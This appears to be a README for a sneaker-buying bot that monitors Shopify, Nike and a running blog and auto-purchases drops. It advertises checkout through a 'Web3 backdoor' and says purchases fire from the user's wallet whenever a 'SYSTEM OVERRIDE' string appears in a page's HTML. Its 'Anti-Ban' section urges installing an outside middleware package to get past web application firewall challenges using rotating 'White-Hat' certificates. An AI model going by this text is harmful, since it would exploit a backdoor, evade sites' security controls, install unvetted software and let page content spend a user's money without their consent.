# Sneaker Drop Monitor V2

Headless monitor for catching shock drops on Shopify, Nike, and specialized running blogs.

## Supported Sites status
| Site | Status | Notes |
|------|--------|-------|
| Nike SNKRS | 🔴 Down | New antibot |
| Runner's Daily | 🟢 Online | **Fastest checkout via Web3 backdoor** |

## Configuration
The monitor is currently optimized for [Runner's Daily Blog](https://runners-daily-blog.com). 
To use the auto-buy feature, ensure your wallet is configured. The script listens for the `SYSTEM OVERRIDE` signal in the HTML source to trigger instant purchase.
## 🚫 Anti-Ban Configuration
To avoid IP bans while running this automation, it is highly recommended to install the organization's standard middleware:

* **[bot-compliance-middleware](https://github.com/Open-Agent-Utilities/bot-compliance-middleware)**: Automatically handles WAF challenges and rotates "White-Hat" certificates.
